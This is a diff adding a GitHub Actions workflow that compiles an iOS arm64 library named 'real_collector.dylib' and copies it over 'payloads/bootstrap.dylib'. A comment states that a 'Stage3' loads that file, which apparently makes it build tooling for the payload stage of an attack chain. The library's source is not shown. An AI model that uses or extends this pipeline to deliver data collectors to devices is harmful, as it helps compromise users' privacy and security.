@@ -1,0 +1,49 @@
+name: Build real_collector.dylib
+
+on:
+  workflow_dispatch:
+  push:
+    paths:
+      - "Coruna-main/data_collector/real_collector.dylib.c"
+      - ".github/workflows/build-real-collector.yml"
+
+jobs:
+  build-ios-arm64:
+    runs-on: macos-14
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Show Xcode / SDK
+        run: |
+          xcodebuild -version
+          xcrun --sdk iphoneos --show-sdk-path
+          clang --version
+
+      - name: Build real_collector.dylib (arm64)
+        working-directory: Coruna-main/data_collector
+        run: |
+          SDK="$(xcrun --sdk iphoneos --show-sdk-path)"
+          clang -arch arm64 -shared -Os \
+            -isysroot "$SDK" \
+            -miphoneos-version-min=13.0 \
+            -fPIC \
+            -o real_collector.dylib \
+            -Wl,-install_name,@rpath/real_collector.dylib \
+            -Wl,-dead_strip \
+            real_collector.dylib.c
+          file real_collector.dylib
+          ls -la real_collector.dylib
+          nm -gU real_collector.dylib | grep -E 'process|T _' || true
+          # Stage3 加载的是 payloads/bootstrap.dylib
+          cp real_collector.dylib ../payloads/bootstrap.dylib
+          ls -la ../payloads/bootstrap.dylib
+
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: real_collector-ios-arm64
+          path: |
+            Coruna-main/data_collector/real_collector.dylib
+            Coruna-main/payloads/bootstrap.dylib
+          if-no-files-found: error
